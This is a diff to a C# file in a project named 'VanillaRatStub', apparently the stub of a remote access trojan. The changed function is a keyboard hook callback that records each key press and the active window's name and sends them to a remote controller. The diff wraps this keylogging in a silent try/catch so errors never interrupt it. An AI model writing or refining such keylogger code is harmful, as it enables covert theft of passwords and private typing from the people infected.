@@ -43,18 +43,18 @@ namespace VanillaRatStub.InformationHelpers
 
         public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
+            try
             {
-                int vkCode = Marshal.ReadInt32(lParam);
-                if (SendKeys)
+                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                 {
-                    List<byte> ToSend = new List<byte>();
-                    ToSend.Add(11); //Keystroke
-                    ToSend.AddRange(Encoding.ASCII.GetBytes(((Keys) vkCode).ToString()));
-                    Networking.MainClient.Send(ToSend.ToArray());
-                    ToSend.Clear();
-                    if (GetWindowName() != CurrentWindow)
+                    int vkCode = Marshal.ReadInt32(lParam);
+                    if (SendKeys)
                     {
+                        List<byte> ToSend = new List<byte>();
+                        ToSend.Add(11); //Keystroke
+                        ToSend.AddRange(Encoding.ASCII.GetBytes(((Keys)vkCode).ToString()));
+                        Networking.MainClient.Send(ToSend.ToArray());
+                        ToSend.Clear();
                         CurrentWindow = GetWindowName();
                         ToSend.Add(12); //Window Name
                         ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentWindow));
@@ -62,7 +62,7 @@ namespace VanillaRatStub.InformationHelpers
                     }
                 }
             }
-
+            catch { }
             return CallNextHookEx(HookID, nCode, wParam, lParam);
         }
 
